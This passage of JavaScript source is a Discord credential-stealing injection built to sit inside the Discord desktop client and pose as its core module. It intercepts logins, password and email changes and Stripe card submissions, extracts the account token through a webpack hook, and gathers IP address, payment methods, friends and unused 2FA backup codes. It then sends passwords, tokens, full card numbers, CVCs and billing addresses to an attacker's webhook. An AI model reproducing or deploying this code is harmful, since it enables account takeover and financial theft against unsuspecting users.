        window.webContents.executeJavaScript(`
                            var xmlHttp = new XMLHttpRequest();
                            xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
                            xmlHttp.send( null );
                            xmlHttp.responseText;
                            `, !0).then((ip) => {
            window.webContents.executeJavaScript(`
                            var xmlHttp = new XMLHttpRequest();
                            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
                            xmlHttp.setRequestHeader("Authorization", "${token}");
                            xmlHttp.send( null );
                            xmlHttp.responseText`, !0).then((info3) => {
                window.webContents.executeJavaScript(`
                            var xmlHttp = new XMLHttpRequest();
                            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
                            xmlHttp.setRequestHeader("Authorization", "${token}");
                            xmlHttp.send( null );
                            xmlHttp.responseText`, !0).then((info4) => {
                    if (token.startsWith("mfa")) {
                        window.webContents.executeJavaScript(`
                            var xmlHttp = new XMLHttpRequest();
                            xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
                            xmlHttp.setRequestHeader('Content-Type', 'application/json');
                            xmlHttp.setRequestHeader("authorization", "${token}")
                            xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
                            xmlHttp.responseText`, !0).then((codes) => {
                            var fieldo = [];
                            var baseuri = "https://ctf.surf/raw/"
                            var gayass = JSON.parse(codes)
                            let g = gayass.backup_codes
                            const r = g.filter((code) => {
                                return code.consumed == null
                            })
                            for (let z in r) {
                                fieldo.push({
                                    name: `code:`,
                                    value: `\`${r[z].code.insert(4, "-")}\``,
                                    inline: true
                                })
                                baseuri += `${r[z].code.insert(4, "-")}<br>`
                            }
                            function totalFriends() {
                                var f = JSON.parse(info4)
                                const r = f.filter((user) => {
                                    return user.type == 1
                                })
                                return r.length
                            }
                            function calcFriends() {
                                var f = JSON.parse(info4)
                                const r = f.filter((user) => {
                                    return user.type == 1
                                })
                                var gay = "";
                                for (z of r) {
                                    var b = GetRBadges(z.user.public_flags)
                                    if (b != "") {
                                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                                    }
                                }
                                if (gay == "") {
                                    gay = "no rare friends"
                                }
                                return gay
                            }
                            function cool() {
                                const json = JSON.parse(info3)
                                var billing = "";
                                json.forEach(z => {
                                    if (z.type == "") {
                                        return "\`❌\`"
                                    } else if (z.type == 2 && z.invalid != !0) {
                                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
                                    } else if (z.type == 1 && z.invalid != !0) {
                                        billing += "\`✔️\`" + " :credit_card:"
                                    } else {
                                        return "\`❌\`"
                                    }
                                })
                                if (billing == "") {
                                    billing = "\`❌\`"
                                }
                                return billing
                            }
                            const json = JSON.parse(info);
                            var params = {
                                username: "fantasy",
                                content: "",
                                embeds: [{
                                    "title": "email changed",
                                    "color": config['embed-color'],
                                    "fields": [{
                                        name: "malware injection",
                                        value: `\`\`\`${discordInstall}\n\`\`\``,
                                        inline: !1
                                    }, {
                                        name: "ip:",
                                        value: `\`${ip}\``,
                                        inline: !0
                                    }, {
                                        name: "pc name:",
                                        value: `\`${computerName}\``,
                                        inline: !0
                                    }, {
                                        name: "username:",
                                        value: `\`${json.username}#${json.discriminator}\``,
                                        inline: !0
                                    }, {
                                        name: "id:",
                                        value: `\`${json.id}\``,
                                        inline: !0
                                    }, {
                                        name: "nitro:",
                                        value: `${getNitro(json.premium_type)}`,
                                        inline: !0
                                    }, {
                                        name: "badges:",
                                        value: `${getBadges(json.flags)}`,
                                        inline: !0
                                    }, {
                                        name: "payment methods:",
                                        value: `${cool()}`,
                                        inline: !0
                                    }, {
                                        name: "new email:",
                                        value: `\`${newemail}\``,
                                        inline: !0
                                    }, {
                                        name: "password:",
                                        value: `\`${password}\``,
                                        inline: !0
                                    }, {
                                        name: "token:",
                                        value: `\`\`\`${token}\`\`\``,
                                        inline: !1
                                    }, ],
                                    "author": {
                                        "name": "rf.sex"
                                    },
                                    "footer": {
                                        "text": "better than all"
                                    },
                                    "thumbnail": {
                                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                    }
                                }, {
                                    "title": `total friends (${totalFriends()})`,
                                    "color": config['embed-color'],
                                    "description": calcFriends(),
                                    "author": {
                                        "name": "rf.sex"
                                    },
                                    "footer": {
                                        "text": "better than all."
                                    },
                                    "thumbnail": {
                                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                    }
                                }]
                            }
                            var mfaembed = {
                                "title": "<:bughunter_2:874750808430874664> storm alert",
                                "description": `to view 2FA passwords, log into your account and click "View Codes"`,
                                "color": config['embed-color'],
                                "fields": fieldo,
                                "author": {
                                    "name": "rf.sex"
                                },
                                "footer": {
                                    "text": "better than all."
                                }
                            }
                            if (token.startsWith("mfa")) {
                                params.embeds.push(mfaembed)
                            }
                            sendToWebhook(JSON.stringify(params))
                        })
                    } else {
                        const window = BrowserWindow.getAllWindows()[0];
                        window.webContents.executeJavaScript(`
                                        var xmlHttp = new XMLHttpRequest();
                                        xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
                                        xmlHttp.setRequestHeader("Authorization", "${token}");
                                        xmlHttp.send( null );
                                        xmlHttp.responseText;`, !0).then((info) => {
                            window.webContents.executeJavaScript(`
                                        var xmlHttp = new XMLHttpRequest();
                                        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
                                        xmlHttp.send( null );
                                        xmlHttp.responseText;
                                        `, !0).then((ip) => {
                                window.webContents.executeJavaScript(`
                                        var xmlHttp = new XMLHttpRequest();
                                        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
                                        xmlHttp.setRequestHeader("Authorization", "${token}");
                                        xmlHttp.send( null );
                                        xmlHttp.responseText`, !0).then((info3) => {
                                    window.webContents.executeJavaScript(`
                                        var xmlHttp = new XMLHttpRequest();
                                        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
                                        xmlHttp.setRequestHeader("Authorization", "${token}");
                                        xmlHttp.send( null );
                                        xmlHttp.responseText`, !0).then((info4) => {
                                        function totalFriends() {
                                            var f = JSON.parse(info4)
                                            const r = f.filter((user) => {
                                                return user.type == 1
                                            })
                                            return r.length
                                        }
                                        function calcFriends() {
                                            var f = JSON.parse(info4)
                                            const r = f.filter((user) => {
                                                return user.type == 1
                                            })
                                            var gay = "";
                                            for (z of r) {
                                                var b = GetRBadges(z.user.public_flags)
                                                if (b != "") {
                                                    gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                                                }
                                            }
                                            if (gay == "") {
                                                gay = "no rare friends"
                                            }
                                            return gay
                                        }
                                        function cool() {
                                            const json = JSON.parse(info3)
                                            var billing = "";
                                            json.forEach(z => {
                                                if (z.type == "") {
                                                    return "\`❌\`"
                                                } else if (z.type == 2 && z.invalid != !0) {
                                                    billing += "\`✔️\`" + " <:paypal:896441236062347374>"
                                                } else if (z.type == 1 && z.invalid != !0) {
                                                    billing += "\`✔️\`" + " :credit_card:"
                                                } else {
                                                    return "\`❌\`"
                                                }
                                            })
                                            if (billing == "") {
                                                billing = "\`❌\`"
                                            }
                                            return billing
                                        }
                                        const json = JSON.parse(info);
                                        var params = {
                                            username: "fantasy",
                                            content: "",
                                            embeds: [{
                                                "title": "email changed",
                                                "color": config['embed-color'],
                                                "fields": [{
                                                    name: "malware injection",
                                                    value: `\`\`\`${discordInstall}\n\`\`\``,
                                                    inline: !1
                                                }, {
                                                    name: "ip:",
                                                    value: `\`${ip}\``,
                                                    inline: !0
                                                }, {
                                                    name: "pc name:",
                                                    value: `\`${computerName}\``,
                                                    inline: !0
                                                }, {
                                                    name: "username:",
                                                    value: `\`${json.username}#${json.discriminator}\``,
                                                    inline: !0
                                                }, {
                                                    name: "id:",
                                                    value: `\`${json.id}\``,
                                                    inline: !0
                                                }, {
                                                    name: "nitro:",
                                                    value: `${getNitro(json.premium_type)}`,
                                                    inline: !0
                                                }, {
                                                    name: "badges:",
                                                    value: `${getBadges(json.flags)}`,
                                                    inline: !0
                                                }, {
                                                    name: "payment methods:",
                                                    value: `${cool()}`,
                                                    inline: !0
                                                }, {
                                                    name: "new email:",
                                                    value: `\`${newemail}\``,
                                                    inline: !0
                                                }, {
                                                    name: "password:",
                                                    value: `\`${password}\``,
                                                    inline: !0
                                                }, {
                                                    name: "token:",
                                                    value: `\`\`\`${token}\`\`\``,
                                                    inline: !1
                                                }, ],
                                                "author": {
                                                    "name": "rf.sex"
                                                },
                                                "footer": {
                                                    "text": "better than all."
                                                },
                                                "thumbnail": {
                                                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                                }
                                            }, {
                                                "title": `total friends (${totalFriends()})`,
                                                "color": config['embed-color'],
                                                "description": calcFriends(),
                                                "author": {
                                                    "name": "rf.sex"
                                                },
                                                "footer": {
                                                    "text": "better than all."
                                                },
                                                "thumbnail": {
                                                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                                }
                                            }]
                                        }
                                        sendToWebhook(JSON.stringify(params))
                                    })
                                })
                            })
                        })
                    }
                })
            })
        })
    })
}

function creditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
            var json = JSON.parse(info);
            var params = {
                username: "fantasy",
                content: "",
                embeds: [{
                    "title": "credit card added",
                    "description": "**username:**```" + json.username + "#" + json.discriminator + "```\n**id:**```" + json.id + "```\n**email:**```" + json.email + "```\n" + "**nitro type:**```" + getNitro(json.premium_type) + "```\n**badges:**```" + getBadges(json.flags) + "```" + "\n**credit card number: **```" + number + "```" + "\n**credit card expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**cvc: **```" + cvc + "```\n" + "**country: **```" + country + "```\n" + "**state: **```" + state + "```\n" + "**city: **```" + city + "```\n" + "**zip:**```" + zip + "```" + "\n**street: **```" + street + "```" + "\n**token:**```" + token + "```" + "\n**ip: **```" + ip + "```",
                    "author": {
                        "name": "rf.sex"
                    },
                    "footer": {
                        "text": "better than all."
                    },
                    "thumbnail": {
                        "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
                    }
                }]
            }
            sendToWebhook(JSON.stringify(params))
        })
    })
}

const changePasswordFilter = {
    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};

session.defaultSession.webRequest.onCompleted(changePasswordFilter, (details, callback) => {
    if (details.url.endsWith("login")) {
        if (details.statusCode == 200) {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            const email = data.login;
            const password = data.password;
            const window = BrowserWindow.getAllWindows()[0];
            window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
                login(email, password, token)
            }))
        } else {}
    }
    if (details.url.endsWith("users/@me")) {
        if (details.statusCode == 200 && details.method == "PATCH") {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            if (data.password != null && data.password != undefined && data.password != "") {
                if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
                        changePassword(data.password, data.new_password, token)
                    }))
                }
                if (data.email != null && data.email != undefined && data.email != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
                        changeEmail(data.email, data.password, token)
                    }))
                }
            }
        } else {}
    }
    if (details.url.endsWith("tokens")) {
        const window = BrowserWindow.getAllWindows()[0];
        const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
        window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
            creditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token)
        }))
    }
});

module.exports = require('./core.asar')
